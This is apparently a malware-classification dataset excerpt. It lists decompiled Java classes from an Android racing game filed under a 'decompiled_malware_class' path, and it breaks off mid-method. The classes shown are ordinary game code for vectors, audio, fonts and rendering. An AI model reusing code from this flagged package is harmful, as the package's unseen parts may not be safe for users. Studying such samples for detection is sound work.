"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools\Vector3.code","public class Vector3 {   public static Vector3 tmp=new Vector3(0.0d,0.0d,0.0d);   public double x;   public double y;   public double z;   public Vector3(  double x,  double y,  double z){     this.x=x;     this.y=y;     this.z=z;   }   public void set(  Vector3 other){     this.x=other.x;     this.y=other.y;     this.z=other.z;   }   public void set(  double x,  double y,  double z){     this.x=x;     this.y=y;     this.z=z;   }   public double lenght(){     return Math.sqrt(sqaredLenght());   }   public double sqaredLenght(){     return (this.x * this.x) + (this.y * this.y) + (this.z * this.z);   }   public Vector3 normalize(){     double l=lenght();     this.x/=l;     this.y/=l;     this.z/=l;     return this;   }   public void add(  Vector3 other){     this.x+=other.x;     this.y+=other.y;     this.z+=other.z;   }   public void add(  Vector3 other,  double mult){     this.x+=other.x * mult;     this.y+=other.y * mult;     this.z+=other.z * mult;   }   public void substract(  Vector3 other){     this.x-=other.x;     this.y-=other.y;     this.z-=other.z;   }   public Vector3 plus(  Vector3 other,  Vector3 result){     result.set(this.x + other.x,this.y + other.y,this.z + other.z);     return result;   }   public Vector3 minus(  Vector3 other,  Vector3 result){     result.set(this.x - other.x,this.y - other.y,this.z - other.z);     return result;   }   public Vector3 plus(  Vector3 other,  double mult,  Vector3 result){     result.set(this.x + (other.x * mult),this.y + (other.y * mult),this.z + (other.z * mult));     return result;   }   public Vector3 minus(  Vector3 other,  double mult,  Vector3 result){     result.set(this.x - (other.x * mult),this.y - (other.y * mult),this.z - (other.z * mult));     return result;   }   public static Vector3 vector(  Point3 p1,  Point3 p2,  Vector3 result){     result.set(p2.x - p1.x,p2.y - p1.y,p2.z - p1.z);     return result;   }   public Vector3 normalized(  double mult,  Vector3 result){     result.set((this.x / lenght()) * mult,(this.y / lenght()) * mult,(this.z / lenght()) * mult);     return result;   }   public Vector3 normalized(  Vector3 result){     result.set(this.x / lenght(),this.y / lenght(),this.z / lenght());     return result;   }   public static Vector3 product(  Vector3 u,  Vector3 v,  Vector3 result){     result.set((u.y * v.z) - (u.z * v.y),(u.z * v.x) - (u.x * v.z),(u.x * v.y) - (u.y * v.x));     return result;   }   public static Vector3 vectorInBase(  Vector3 direction,  Vector3 i,  Vector3 j,  Vector3 k,  Vector3 result){     result.set(0.0d,0.0d,0.0d);     result.add(i,direction.x);     result.add(j,direction.y);     result.add(k,direction.z);     return result;   }   public double dotProduct(  Vector3 other){     return (this.x * other.x) + (this.y * other.y) + (this.z * other.z);   }   public static double dotProduct(  Vector3 u,  Vector3 v){     return (u.x * v.x) + (u.y * v.y) + (u.z * v.z);   }   public String toString(){     return ""["" + this.x + "" ""+ this.y+ "" ""+ this.z+ ""]"";   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools.audio\AudioStream.code","public class AudioStream {   private boolean continuous;   private int id;   private boolean paused;   private float rate=1.0f;   private float volume;   public AudioStream(  int id,  boolean continuous,  float volume){     this.id=id;     this.continuous=continuous;     this.volume=volume;   }   public boolean isPaused(){     return this.paused;   }   public int getId(){     return this.id;   }   public void pause(){     this.paused=true;     RokonAudio.singleton.getSoundPool().pause(this.id);   }   public void resume(){     this.paused=false;     RokonAudio.singleton.getSoundPool().resume(this.id);   }   public void stop(){     RokonAudio.singleton.getSoundPool().stop(this.id);   }   public void setContinuous(  boolean continuous){     if (continuous) {       RokonAudio.singleton.getSoundPool().setLoop(this.id,-1);     }  else {       RokonAudio.singleton.getSoundPool().setLoop(this.id,0);     }     this.continuous=continuous;   }   public boolean isContinuous(){     return this.continuous;   }   public void setVolume(  float volume){     this.volume=volume;     RokonAudio.singleton.getSoundPool().setVolume(this.id,volume,volume);   }   public float getVolume(){     return this.volume;   }   public void setRate(  float rate){     this.rate=rate;     RokonAudio.singleton.getSoundPool().setRate(this.id,rate);   }   public float getRate(){     return this.rate;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools.audio\RokonAudio.code","public class RokonAudio {   public static final int MAX_SOUNDS=50;   public static final int MAX_STREAMS=8;   public static boolean mute=false;   public static RokonAudio singleton;   private int i;   private int j;   public float masterVolume;   private SoundFile[] soundArr=new SoundFile[50];   private SoundPool soundPool;   public RokonAudio(){     singleton=this;     this.soundPool=new SoundPool(8,3,0);     this.masterVolume=1.0f;   }   public void mute(){     mute=true;   }   public void unmute(){     mute=false;   }   public boolean isMuted(){     return mute;   }   public void destroy(){     try {       this.i=0;       while (this.i < 8) {         this.soundArr[this.i].unload();         this.i++;       }       this.soundPool.release();     }  catch (    Exception e) {     }     this.soundPool=null;   }   public SoundFile[] getSounds(){     return this.soundArr;   }   public SoundPool getSoundPool(){     return this.soundPool;   }   public SoundFile createSoundFile(  String filename){     try {       int id=this.soundPool.load(OsarisTools.activity.getAssets().openFd(filename),0);       SoundFile soundFile=new SoundFile(id);       this.j=-1;       this.i=0;       while (this.i < 50) {         if (this.soundArr[this.i] == null) {           this.j=this.i;         }         this.i++;       }       if (this.j == -1) {         return null;       }       this.soundArr[this.j]=soundFile;       return soundFile;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public void removeSoundFile(  SoundFile soundFile){     this.soundPool.unload(soundFile.getId());     this.i=0;     while (this.i < 50) {       if (this.soundArr[this.i] != null && this.soundArr[this.i].equals(soundFile)) {         this.soundArr[this.i]=null;       }       this.i++;     }   }   public void removeAllSoundFiles(){     this.i=0;     while (this.i < 50) {       this.soundArr[this.i]=null;       this.i++;     }     this.soundPool.release();   }   public void setMasterVolume(  float masterVolume){     this.masterVolume=masterVolume;   }   public float getMasterVolume(){     return this.masterVolume;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools.audio\RokonMusic.code","public class RokonMusic {   protected static MediaPlayer mediaPlayer;   protected static boolean mustResume=false;   public static boolean musicOn=true;   private static void prepareMediaPlayer(){     mediaPlayer=new MediaPlayer();   }   public static void play(  String file){     if (musicOn) {       play(file,false);     }   }   public static void play(  String file,  boolean loop){     if (musicOn) {       prepare(file,loop);       mediaPlayer.start();     }   }   public static void prepare(  String file,  boolean loop){     if (musicOn) {       prepareMediaPlayer();       mediaPlayer.setLooping(loop);       try {         AssetFileDescriptor afd=OsarisTools.activity.getAssets().openFd(file);         try {           mediaPlayer.setDataSource(afd.getFileDescriptor(),afd.getStartOffset(),afd.getLength());           afd.close();           if (!JumpyBall.blackberry) {             mediaPlayer.setAudioStreamType(3);           }           try {             mediaPlayer.prepare();           }  catch (          Exception e) {             e.printStackTrace();           }         }  catch (        Exception e2) {           e2.printStackTrace();         }       }  catch (      Exception e3) {         e3.printStackTrace();       }     }   }   public static void play(){     if (musicOn && mediaPlayer != null) {       mediaPlayer.start();     }   }   public static void stop(){     if (mediaPlayer != null) {       mediaPlayer.stop();     }   }   public static void pause(){     if (mediaPlayer != null) {       mediaPlayer.pause();     }   }   public static void onPause(){     if (mediaPlayer != null && mediaPlayer.isPlaying()) {       mediaPlayer.pause();     }   }   public static void onResume(){     if (musicOn && mediaPlayer != null && mustResume) {       mediaPlayer.start();       mustResume=false;     }   }   public static MediaPlayer getMediaPlayer(){     if (mediaPlayer == null) {       mediaPlayer=new MediaPlayer();     }     return mediaPlayer;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools.audio\SoundFile.code","public class SoundFile {   private AudioStream audioStream;   private int id;   private boolean res;   private int result;   public SoundFile(  int streamId){     this.id=streamId;   }   public int getId(){     return this.id;   }   public AudioStream play(  boolean res){     if (RokonAudio.mute) {       return null;     }     this.result=RokonAudio.singleton.getSoundPool().play(this.id,RokonAudio.singleton.getMasterVolume(),RokonAudio.singleton.getMasterVolume(),1,0,1.0f);     if (this.result == 0) {       return null;     }     this.audioStream=new AudioStream(this.result,false,RokonAudio.singleton.getMasterVolume());     return this.audioStream;   }   public int play(  float volume){     return play(volume,1.0f);   }   public int play(  float volume,  float speed){     if (RokonAudio.mute) {       return 0;     }     return RokonAudio.singleton.getSoundPool().play(this.id,RokonAudio.singleton.getMasterVolume() * volume,RokonAudio.singleton.getMasterVolume() * volume,1,0,speed);   }   public AudioStream playContinuous(  float d){     int result;     if (!RokonAudio.mute && (result=RokonAudio.singleton.getSoundPool().play(this.id,RokonAudio.singleton.getMasterVolume() * d,RokonAudio.singleton.getMasterVolume() * d,0,-1,1.0f)) != 0) {       this.audioStream=new AudioStream(result,true,RokonAudio.singleton.getMasterVolume() * d);       return this.audioStream;     }     return null;   }   public void unload(){     this.res=RokonAudio.singleton.getSoundPool().unload(this.id);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools.text\Font.code","public class Font {   public static final float DEFAULT_FONT_SIZE=52.0f;   public static final int MAX_LINES=40;   protected Rect bounds;   protected Paint.FontMetrics fontMetrics;   public Paint paint;   protected Typeface typeface;   public Font(  Typeface typeface){     this.typeface=typeface;     init();   }   public Font(  String assetPath){     this.typeface=Typeface.createFromAsset(OsarisTools.activity.getAssets(),assetPath);     init();   }   private void init(){     this.paint=new Paint();     this.paint.setTypeface(this.typeface);     this.paint.setTextSize(52.0f);     this.paint.setAntiAlias(true);     this.fontMetrics=this.paint.getFontMetrics();     this.bounds=new Rect();   }   public void setFontSize(  float fontSize){     this.paint.setTextSize(fontSize);     this.fontMetrics=this.paint.getFontMetrics();   }   public void setColor(  int r,  int v,  int b,  int alpha){     this.paint.setARGB(alpha,r,v,b);   }   public static int nextPowerOfTwo(  int minimum){     if (!isPowerOfTwo(minimum)) {       int i=0;       do {         i++;       }  while (Math.pow(2.0d,i) < minimum);       return (int)Math.pow(2.0d,i);     }     return minimum;   }   public static boolean isPowerOfTwo(  int x){     return x != 0 && ((x + (-1)) & x) == 0;   }   public Sprite createTexture(  String text,  int fontSize,  boolean bigable){     Bitmap bmp2;     this.paint.getTextBounds(text,0,text.length(),this.bounds);     int bitmapWidth=this.bounds.right - this.bounds.left;     int bitmapHeight=(-this.bounds.top) + this.bounds.bottom > 32 ? (-this.bounds.top) + this.bounds.bottom : 32;     Bitmap bmp=Bitmap.createBitmap(Math.max(bitmapWidth + 1,1),Math.max(bitmapHeight + 1,1),Bitmap.Config.ARGB_8888);     Canvas canvas=new Canvas(bmp);     canvas.drawText(text,0 - this.bounds.left,0 - this.bounds.top,this.paint);     if (bitmapWidth > 192) {       bmp2=Bitmap.createScaledBitmap(bmp,nextPowerOfTwo(bitmapWidth / 2),32,true);     }  else {       bmp2=Bitmap.createScaledBitmap(bmp,nextPowerOfTwo(bitmapWidth),32,true);     }     float realFontSize=(float)((bigable ? 1.2d : 0.94d) * fontSize);     int[] textures=new int[1];     GLES10.glGenTextures(1,textures,0);     GLES10.glBindTexture(3553,textures[0]);     GLES10.glTexParameterf(3553,10241,9728.0f);     if (!Osaris2D3D.LOW_END_DEVICE) {       GLES10.glTexParameterf(3553,10240,9729.0f);       GLES10.glTexParameterf(3553,10241,9729.0f);     }  else {       GLES10.glTexParameterf(3553,10240,9729.0f);     }     GLES10.glTexParameterf(3553,10242,33071.0f);     GLES10.glTexParameterf(3553,10243,33071.0f);     GLES10.glTexEnvf(8960,8704,8448.0f);     GLUtils.texImage2D(3553,0,bmp2,0);     return new Sprite((int)((bitmapWidth * (0.9f * realFontSize)) / bitmapHeight),(int)(1.0f * realFontSize),textures[0],true);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools.text\Text.code","public class Text {   public static final int BLACK=2;   public static final int BLUE=0;   public static final int GREEN=3;   public static final int ORANGE=1;   public static final int RED=5;   public static final int VERT=7;   public static final int WHITE=4;   public static final int YELLOW=6;   private static Font font=null;   private static Font font1=null;   private static Font font2=null;   private static final int maxCached=16;   private static final int nbTables=10;   private static final Hashtable[] textes=new Hashtable[10];   private static Sprite[][] nombres=(Sprite[][])Array.newInstance((Class<?>)Sprite.class,10,10);   private static final Queue all=new LinkedList();   public static boolean initDone=false;   public static void draw(  String text,  int x,  int y,  int fontSize,  int color,  int table){     String name=String.valueOf(color) + ""_"" + fontSize+ ""_""+ text;     prepare(text,fontSize,color,table);     ((Sprite)textes[table].get(name)).draw(x,y - 5);   }   public static void prepare(  String text,  int fontSize,  int color,  int table){     String name=String.valueOf(color) + ""_"" + fontSize+ ""_""+ text;     if (!textes[table].containsKey(name)) {       System.out.println(""CREATING TEXT "" + text);       textes[table].put(name,getSprite(fontSize,text,color,JumpyBall.chinese && !text.equals(""/"")));       System.out.println(""END CREATING TEXT "" + text);       if (table != 0) {         all.add(name);         if (all.size() >= maxCached) {           ((Sprite)textes[table].remove(all.poll())).destroy();         }       }     }   }   public static void draw(  String text,  int x,  int y,  int fontSize,  int color){     draw(text,x,y,fontSize,color,1);   }   public static Sprite getSprite(  int fontSize,  String text,  int color,  boolean bigable){     font=font1;     if (color == 0) {       font.setColor(175,190,200,240);     }  else     if (color == 1) {       font.setColor(225,97,25,230);     }  else     if (color == 2) {       font=font2;       font.setColor(0,0,0,170);     }  else     if (color == 3) {       font.setColor(60,163,120,230);     }  else     if (color == 4) {       if (text.length() > 1) {         font=font2;       }       font.setColor(240,240,240,255);     }  else     if (color == 5) {       if (text.length() > 1) {         font=font2;       }       font.setColor(255,10,10,220);     }  else     if (color == 7) {       if (text.length() > 1) {         font=font2;       }       font.setColor(10,240,10,220);     }  else     if (color == 6) {       font=font2;       font.setColor(190,130,30,255);     }     return font.createTexture(text,fontSize,bigable);   }   public static void init(  Font f1,  Font f2){     initDone=true;     font1=f1;     font2=f2;     for (int i=0; i < 10; i++) {       textes[i]=new Hashtable();     }   }   public static void reInit(){     if (initDone) {       System.out.println(""Clearing all texts"");       for (int i=0; i < 10; i++) {         for (        Object key : textes[i].keySet()) {           ((Sprite)textes[i].get(key)).destroy();         }         textes[i].clear();       }       all.clear();       nombres=(Sprite[][])Array.newInstance((Class<?>)Sprite.class,10,10);     }   }   public static void drawNb(  int nb,  int x,  int y,  int fontSize,  int color){     if (nb >= 0) {       prepareNb(nb,fontSize,color);       if (nb == 1) {         nombres[color][nb].draw((JumpyBall.COREAN ? 7 : 0) + x + 10,(JumpyBall.COREAN ? 2 : 0) + y);       }  else {         nombres[color][nb].draw((JumpyBall.COREAN ? 7 : 0) + x,y + (JumpyBall.COREAN ? 2 : 0));       }     }   }   public static void prepareNb(  int nb,  int fontSize,  int color){     if (nb >= 0 && nombres[color][nb] == null) {       nombres[color][nb]=getSprite((int)(fontSize * 0.9d),new StringBuilder(String.valueOf(nb)).toString(),color,false);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\attr.code","public static final class attr { } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\BuildConfig.code","public final class BuildConfig {   public static final boolean DEBUG=true; } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\drawable.code","public static final class drawable {   public static final int app_sugoku=0x7f020000;   public static final int app_sugoku0=0x7f020001;   public static final int app_sugoku1=0x7f020002;   public static final int app_sugoku2=0x7f020003; } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\InGame.code","public class InGame extends Osaris2D3D {   public static final int INFINITE=2;   public static final int LOAD=4;   public static final int LOSE=2;   public static final int NORMAL=0;   public static final int PAUSE=5;   public static final int PLAY=1;   public static final int PURSUIT=1;   public static final int SIZENB=31;   public static final int WIN=3;   public static SoundFile acc=null;   public static float angleX=0.0f;   public static float angleY=0.0f;   static SoundFile bip1=null;   public static SoundFile blam=null;   static SoundFile blip=null;   private static Sprite boost=null;   public static SoundFile boostsnd=null;   static float cielx=0.0f;   public static Sprite close=null;   public static Vaisseau[] concurrents=null;   static AudioStream eng=null;   static SoundFile engine=null;   private static Vaisseau[] ennemis=null;   public static SoundFile expl=null;   static SoundFile go=null;   static SoundFile go1=null;   static SoundFile go2=null;   static SoundFile go3=null;   private static Sprite[] go321=null;   public static float help=0.0f;   static SoundFile last=null;   public static float lastZ=0.0f;   private static Sprite mLoading=null;   private static Sprite mines=null;   public static SoundFile minesnd=null;   private static Sprite miss1=null;   private static Sprite miss2=null;   public static SoundFile missw=null;   private static Sprite mort=null;   public static final int nbCircuits=19;   static final int nbCircuitsInfinis=4;   public static int penalties;   private static Sprite rect;   public static Sprite soleil;   static int[] textures;   private static Sprite vie;   private static Sprite[] woosh;   private float decY;   public static boolean multi=false;   public static int playerId=2;   public static int nbPlayers=4;   public static float anglePCX=0.0f;   public static float anglePCY=0.0f;   public static float anglePCZ=0.0f;   public static float movePCX=0.0f;   public static float movePCY=0.0f;   public static float movePCZ=0.0f;   public static boolean flashPC=false;   static boolean stopAll=false;   public static boolean iSortaWannaTakScreenzWHenWelYaKnowYaIsSortaTuchinOnDaScreen=false;   public static int vaisseau=0;   public static int scoreInfini=0;   static int nbEnnemis=0;   static int nbEnnemisNormal=6;   public static int nbConcurrents=nbEnnemis + 1;   public static int nbLaps=4;   public static int lapsDone=0;   static int br=0;   static float bri=0.0f;   static int nbSegments=Piste.nbSegments;   private static int lapSecond=0;   private static int lapMinute=0;   private static int lapDixieme=0;   private static int lastLapSecond=0;   private static int lastLapMinute=0;   private static int lastLapDixieme=0;   private static long lapTime0=0;   private static boolean enTete=false;   private static int ennemiSecond=0;   private static int ennemiMinute=0;   private static int ennemiDixieme=0;   private static long ennemiTime0=0;   private static long ennemiTime1=0;   public static boolean cockpitView=false;   public static int state=1;   static float angleb=0.0f;   static int nbs=16;   public static int mode=1;   public static int pos=0;   private static boolean loading=false;   public static int circuitId=0;   public static Vaisseau player=new Vaisseau();   private static float decAngleInfini=0.0f;   private static float decAngleYInfini=0.0f;   public static boolean gameOver=false;   public static boolean paused=false;   static int lastTrack=-365;   static int lastMode=-365;   static int defColor=0;   static int defColor2=0;   public static boolean finished=false;   public static boolean hasDrawnOnce=false;   static int nbCrosses=60;   static int[] xCrosses=new int[nbCrosses];   static float[] yCrosses=new float[nbCrosses];   private static Sprite[] cross=new Sprite[nbCrosses];   static boolean okokDONTMOVEDONTMOVEDONTDOTHATNOOOOOOOOOOOOOOOOOOOOOO=false;   public static int controlMode=0;   public static float effacc=0.0f;   public static float effblam=0.0f;   public static float effblamx=0.0f;   public static float effblamy=0.0f;   public static float lastZT=0.0f;   public static boolean stopAllAndIMeanReallyAllIFuckinWannaQuitNOW=false;   int wooshi=0;   int skybuffer=0;   ByteBuffer PixelBuffer=ByteBuffer.allocateDirect(4);   public InGame(  boolean useTranslucentBackground){   }   @Override public void drawFrame(){     if (!stopAllAndIMeanReallyAllIFuckinWannaQuitNOW) {       if (controlMode > 0) {         lastZ=lastZT;       }       initGL();       if (loading || state == 4) {         setMatrix2D();         GLES10.glTranslatef(-160.0f,-240.0f,0.0f);         GLES10.glTranslatef(96.0f,176.0f,0.0f);         mLoading.draw();         if (!hasDrawnOnce) {           hasDrawnOnce=true;           return;         }  else {           if (!loading) {             restart(mode);             return;           }           return;         }       }       Piste.clearColor();       if (paused && multi) {         MultiplayerAppliance.prepareSend();       }       if (!paused && state != 5 && (state == 1 || state == 2 || mode == 2)) {         time();       }       if (!paused && (state == 1 || state == 2 || state == 3)) {         doPhysics(0.0f,0.0f,lastZ);       }       int i=Piste.level;       setMatrix3D();       if (Piste.hasSkybox) {         if (finished) {           Segment seg=Piste.getSegments(Piste.tailleCircuit - 24);           drawSkyBox(seg.getAngle(0.0f),seg.getAngleY(0.0f),0.0f);         }  else {           drawSkyBox(((-player.angle) - player.segment.getAngle(player.mTz)) + help,angleY,(-player.angleZ) / 12.0f);         }       }       GLES10.glEnable(2929);       float x=player.x;       if (finished) {         Piste.getSegments(Piste.tailleCircuit - 16).simpleTranslateToThisSegment();       }  else {         player.segment.translateToThisSegment(player.mTz,x,player.angle - help,(-player.angleZ) / 3.0f,(-player.yb) + (this.decY * 0.55f),angleY);       }       float[] position={1.0f,0.25f,0.3f,0.0f};       GLES10.glLightfv(16384,4611,position,0);       player.angleY=angleY;       int pz=player.z;       if (finished) {         pz=Piste.tailleCircuit - 24;       }       int i2=2;       while (true) {         if (i2 >= (JumpyBall.PC ? 30 : 0) + nbSegments + 2) {           break;         }         if ((!LOW_END_DEVICE && i2 < nbSegments - 4) || JumpyBall.PC) {           GLES10.glEnable(2912);         }         Piste.getSegments(((nbSegments + pz) - 2) - i2).draw();         if ((!LOW_END_DEVICE && i2 < nbSegments - 4) || JumpyBall.PC) {           GLES10.glDisable(2912);         }         Piste.getSegments((((nbSegments + pz) - 2) - i2) + 1).drawTrucs(true);         Piste.getSegments((((nbSegments + pz) - 2) - i2) + 1).drawTrucs(false);         i2++;       }       if ((pz - 2) + 1 >= 0) {         Piste.getSegments((pz - 2) + 1).drawTrucs(true);         Piste.getSegments((pz - 2) + 1).drawTrucs(false);       }       if (milli < 500 && gameOver) {         player.flash.setTexture(VaisseauFactory.texFlash);       }       GLES10.glDisable(2929);       if (!iSortaWannaTakScreenzWHenWelYaKnowYaIsSortaTuchinOnDaScreen) {         setMatrix2D();         if (!finished && !gameOver) {           rect.draw(220,150);           Text.draw(Messages.getString(R.string.InGameSSpeedUnit),310,168,20,defColor2,0);           drawNb((int)(player.vzb * 200.0f),4,376,196,31,defColor,2);         }         if (mode == 2) {           rect.draw(-480,-278);         }  else {           rect.draw(-600,-278);         }         if (mode == 0) {           Text.draw(Messages.getString(R.string.InGameSPosition),-376,-182,20,defColor2,0);           Text.drawNb(pos,-314,-184,31,defColor);           if (!finished) {             Text.draw(Messages.getString(R.string.InGameS2),-376,-228,24,defColor2,0);             Text.drawNb(lapsDone + 1,-314,-230,31,defColor);             Text.draw(Messages.getString(R.string.InGameS3),-280,-226,26,defColor,0);             Text.drawNb(nbLaps,-254,-230,31,defColor);           }         }         if (second == 0 && minute == 0) {           go321[0].draw(-128,-190);         }         if (second == -3 && minute == 0) {           go321[3].draw(-64,-190);         }         if (second == -2 && minute == 0) {           go321[2].draw(-64,-190);         }         if (second == -1 && minute == 0) {           go321[1].draw(-64,-190);         }         if (player.hasWeapon == Vaisseau.MISSILE1 && state == 1) {           miss1.draw(296,(-40) - ((controlMode != 1 || JumpyBall.blackberry) ? 0 : 144));         }  else         if (player.hasWeapon == Vaisseau.MISSILE2 && state == 1) {           miss2.draw(296,(-40) - ((controlMode != 1 || JumpyBall.blackberry) ? 0 : 144));         }  else         if (player.hasWeapon == Vaisseau.MINES && state == 1) {           mines.draw(296,(-40) - ((controlMode != 1 || JumpyBall.blackberry) ? 0 : 144));         }  else         if (player.hasWeapon == Vaisseau.BOOST && state == 1) {           boost.draw(296,(-40) - ((controlMode != 1 || JumpyBall.blackberry) ? 0 : 144));         }         if (JumpyBall.blackberry && !JumpyBall.KEYONLY) {           close.draw(308,-228);         }         if (mode == 2) {           Text.draw(Messages.getString(R.string.InGameS4),-316,-224,20,defColor2,0);           drawNb(scoreInfini,6,-316,-194,31,defColor,0);           for (int i3=0; i3 < 10; i3++) {             if (i3 < 10.0f - player.vieRestante) {               mort.draw(-375,(i3 * 6) - 224);             }  else {               vie.draw(-375,(i3 * 6) - 224);             }           }         }         if (mode == 1) {           if (player.mTz + player.z > ennemis[0].z + ennemis[0].mTz) {             Text.draw(Messages.getString(R.string.InGameS5),-376,-224,20,defColor,0);             drawNb((int)(Math.abs((player.mTz + player.z) - (ennemis[0].z + ennemis[0].mTz)) * 10.0d),3,-376,-194,31,defColor,0);           }  else {             Text.draw(Messages.getString(R.string.InGameS6),-376,-224,20,defColor,0);             drawNb((int)(Math.abs((player.mTz + player.z) - (ennemis[0].z + ennemis[0].mTz)) * 10.0d),3,-376,-194,31,5,0);           }         }         if (gameOver) {           Text.draw(Messages.getString(R.string.InGameS7),-176,-24,48,defColor,0);         }         if (state == 5 || paused) {           Text.draw(multi ? ""Connecting..."" : Messages.getString(R.string.InGameS8),-186,-24,48,defColor,0);         }         if (finished) {           Text.draw(Messages.getString(R.string.InGameS9),-210,-24,34,defColor,0);         }         if (!finished) {           rect.draw(-590,168);           if ((lapMinute * 60) + lapSecond > 3 || lapsDone == 0 || mode != 0) {             drawTime(lapMinute,lapSecond,lapDixieme,-376,196,31,defColor,0,1);           }  else           if (milli % 500 > 250) {             drawTime(lastLapMinute,lastLapSecond,lastLapDixieme,-376,196,31,defColor,0,1);           }         }         if (mode == 0 && (lapMinute * 60) + lapSecond < 3 && lapsDone > 0) {           if (lapsDone + 1 == nbLaps && milli > 500) {             Text.draw(Messages.getString(R.string.InGameS10),JumpyBall.chinese ? -210 : -110,-164,48,defColor,0);           }           if (!enTete) {             drawTime(ennemiMinute,ennemiSecond,ennemiDixieme,0,-110,31,5,1,2);           }           if (enTete) {             drawTime(ennemiMinute,ennemiSecond,ennemiDixieme,0,-110,31,7,1,3);           }         }         if (state == 3) {           if (mode == 0) {             Text.draw(Messages.getString(R.string.InGameS11),JumpyBall.chinese ? -300 : -136,40,48,defColor,0);           }  else           if (mode == 1) {             Text.draw(Messages.getString(R.string.InGameS11),JumpyBall.chinese ? -300 : -136,-24,48,defColor,0);           }         }         if (mode == 2 && Tracks.mode == 0 && scoreInfini > Tracks.lvlScore[Tracks.currentLvl] && scoreInfini < Tracks.lvlScore[Tracks.currentLvl] + 300 && scoreInfini % 100 < 50) {           Text.draw(Messages.getString(R.string.InGameS11),JumpyBall.chinese ? -300 : -136,-24,48,defColor,0);         }         if (player.angle >= 50.0f || player.angle <= -50.0f) {           sprites.draw(""lock1"");         }         if (player.vzb > player.params[3] && !finished && !paused) {           setMatrix3D();           GLES10.glDisable(2912);           GLES10.glBlendFunc(1,771);           GLES10.glLoadIdentity();           GLES10.glMatrixMode(5888);           if (angleY > 0.0f) {             GLES10.glRotatef(angleY * 0.25f,1.0f,0.0f,0.0f);           }           GLES10.glRotatef((-player.angle) * 1.35f,0.0f,1.0f,0.0f);           GLES10.glRotatef((-90.0f) + anglePCX,1.0f,0.0f,0.0f);           GLES10.glRotatef((-180.0f) + anglePCY,0.0f,1.0f,0.0f);           for (int i4=20; i4 < nbCrosses; i4++) {             GLES10.glRotatef((9800.0f / nbCrosses) * i4,0.0f,1.0f,0.0f);             GLES10.glTranslatef(0.0f,0.0f,2.0f);             GLES10.glRotatef(-180.0f,0.0f,0.0f,1.0f);             GLES10.glTranslatef(0.0f,0.0f,0.8f);             GLES10.glScalef(0.01f,0.01f,0.01f);             float alpha=Math.min(Math.max((yCrosses[i4] + 1700.0f) / 1700.0f,0.0f),0.8f) * Math.max(0.0f,Math.min(1.0f,0.5f * ((player.vzb - player.params[3]) + 0.25f)));             GLES10.glColor4f(alpha,alpha,alpha,alpha);             cross[i4].draw(xCrosses[i4] - 400,yCrosses[i4] - 240.0f);             yCrosses[i4]=(float)(r1[i4] + ((60.0d + i4) * delta * 1.0d* (player.vzb + 4.0f)));             if (yCrosses[i4] > -200.0f) {               xCrosses[i4]=(int)((Math.random() * 700.0d) - 350.0d);               float[] fArr=yCrosses;               fArr[i4]=fArr[i4] - 1500.0f;             }             GLES10.glScalef(100.0f,100.0f,100.0f);             GLES10.glTranslatef(0.0f,0.0f,-0.8f);             GLES10.glRotatef(180.0f,0.0f,0.0f,1.0f);             GLES10.glTranslatef(0.0f,0.0f,-2.0f);             GLES10.glRotatef(((-9800.0f) / nbCrosses) * i4,0.0f,1.0f,0.0f);           }           GLES10.glBlendFunc(770,771);           GLES10.glColor4f(1.0f,1.0f,1.0f,1.0f);         }       }     }   }   public int makeBuffer(  int x,  int y){     this.PixelBuffer.position(0);     GLES10.glReadPixels(x,480 - y,1,1,6407,5121,this.PixelBuffer);     byte[] b=new byte[4];     this.PixelBuffer.get(b);     int mTemp=b[0];     return mTemp;   }   public void drawSkyBox(  float angleX2,  float angleY2,  float angleZ){     GLES10.glDisable(2929);     GLES10.glDisable(3042);     GLES10.glDisable(2912);     GLES10.glPushMatrix();     GLES10.glLoadIdentity();     GLES10.glRotatef(decAngleYInfini + angleY2,1.0f,0.0f,0.0f);     GLES10.glRotatef(decAngleInfini + angleX2,0.0f,1.0f,0.0f);     GLES10.glRotatef(angleZ,0.0f,0.0f,1.0f);     GLES10.glTranslatef(0.0f,0.6f,0.0f);     Piste.skybox.draw();     GLES10.glPopMatrix();     boolean z=LOW_END_DEVICE;     GLES10.glEnable(3042);     GLES10.glEnable(2929);   }   public void doPhysics(  float lastX,  float lastY,  float lastZ2){     if (!stopAll && !stopAllAndIMeanReallyAllIFuckinWannaQuitNOW && state != 5) {       if (state != 2) {         lastY=90.0f;       }       if (state == 2 || state == 3 || second < 0 || finished || gameOver) {         lastX=0.0f;         lastY=0.0f;         lastZ2=0.0f;         if (mode == 2 && gameOver && milli < 500) {           player.flash.setTexture(VaisseauFactory.texFlashRed);         }       }       float gAngleY=player.segment.getAngleY(player.mTz);       float vangleY=-(angleY - gAngleY);       if (angleY < gAngleY) {         angleY+=Math.min(delta * vangleY * 0.2f,vangleY);       }  else {         angleY+=Math.max(delta * vangleY * 0.2f,vangleY);       }       help=(float)(help - ((help * 0.5d) * delta));       this.decY=(float)(this.decY - (((this.decY - player.vyb) * 0.6d) * delta));       decAngleInfini=(float)(decAngleInfini - Math.max(Math.min((decAngleInfini * 